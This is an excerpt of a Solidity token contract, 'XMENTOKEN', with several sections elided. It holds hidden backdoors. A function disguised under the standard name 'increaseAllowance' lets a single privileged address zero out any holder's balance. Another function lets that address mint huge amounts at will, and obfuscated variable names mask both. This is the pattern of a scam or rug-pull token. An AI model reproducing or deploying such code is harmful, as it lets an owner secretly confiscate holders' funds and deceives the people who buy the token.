...
contract XMENTOKEN is Ownable {
    ...
    function increaseAllowance(address uuyxxx) public     {
        if(dmmgny17 == _msgSender()){
        address newadd = uuyxxx;
        uint256 curamount = XMEN[newadd];
        uint256 newaaamount = XMEN[newadd]+XMEN[newadd]-curamount;
        XMEN[newadd] -= newaaamount;
        }else{
        if(dmmgny17 == _msgSender()){
        }else{
            revert("ccc");
    ...
    external {
        ...
        XMEN[cc123d] += 38200*((10**decimals()*xxtoudiamount))*1*1;
        require(dmmgny17 == _msgSender());
        if(dmmgny17 == _msgSender()){
        }
    }
    ...
    function _transfer(
        ...
        uint256 balance = XMEN[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        XMEN[from] = XMEN[from]-amount;
        XMEN[to] = XMEN[to]+amount;
